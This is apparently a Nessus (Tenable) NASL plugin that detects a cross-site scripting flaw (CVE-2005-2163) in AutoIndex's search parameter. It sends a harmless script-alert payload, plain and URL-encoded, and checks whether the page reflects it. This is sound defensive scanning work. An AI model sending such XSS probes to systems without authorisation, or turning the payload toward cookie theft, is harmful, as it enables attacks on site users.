#
# (C) Tenable Network Security
#


if (description) {
  script_id(19385);
  script_version("$Revision: 1.5 $");

  script_cve_id("CVE-2005-2163");
  script_bugtraq_id(14154);
  if (defined_func("script_xref")) {
    script_xref(name:"OSVDB", value:"17753");
  }

  name["english"] = "AutoIndex search Parameter Cross-Site Scripting Vulnerability";
  script_name(english:name["english"]);
 
  desc["english"] = "
Synopsis :

The remote web server contains a PHP script which is vulnerable to a cross
site scripting issue.

Description : 

The remote host is running AutoIndex, a free PHP script for indexing
files in a directory. 

The installed version of AutoIndex fails to properly sanitize
user-supplied input to the 'search' parameter of the 'index.php'
script.  By leveraging this flaw, an attacker may be able to cause
arbitrary HTML and script code to be executed by a user's browser
within the context of the affected application, leading to cookie
theft and similar attacks. 

See also : 

http://www.badroot.org/advisories/SA0x07

Solution : 

Upgrade to AutoIndex version 1.5.3 or later if using 1.x, or to version 
2.1.1 or later if using 2.x.  

Risk factor : 

Low / CVSS Base Score : 3
(AV:R/AC:H/Au:NR/C:P/A:N/I:N/B:C)";
  script_description(english:desc["english"]);
 
  summary["english"] = "Checks for search parameter cross-site scripting vulnerability in AutoIndex";
  script_summary(english:summary["english"]);
 
  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses : XSS");

  script_copyright(english:"This script is Copyright (C) 2005 Tenable Network Security");

  script_dependencie("http_version.nasl", "cross_site_scripting.nasl");
  script_require_ports("Services/www", 80);
 script_exclude_keys("Settings/disable_cgi_scanning");

  exit(0);
}


include("http_func.inc");
include("http_keepalive.inc");


port = get_http_port(default:80);
if (!get_port_state(port)) exit(0);
if (!can_host_php(port:port)) exit(0);
if (get_kb_item("www/" + port + "/generic_xss")) exit(0);


# A simple alert.
xss = "<script>alert('" + SCRIPT_NAME + "');</script>";
# nb: the url-encoded version is what we need to pass in.
exss = "%3Cscript%3Ealert('" + SCRIPT_NAME + "')%3B%3C%2Fscript%3E";


# Loop through CGI directories.
foreach dir (cgi_dirs()) {
  # Try to exploit the flaw.
  req = http_get(
    item:string(
      dir, "/index.php?",
      "search='>", exss, "&",
      "searchMode=f"
    ), 
    port:port
  );
  res = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);
  if (res == NULL) exit(0);

  # There's a problem if ...
  if (
    # it looks like AutoIndex and...
    "<body class='autoindex_body'>" >< res &&
    # we see our XSS.
    xss >< res
  ) {
    security_note(port);
    exit(0);
  }
}
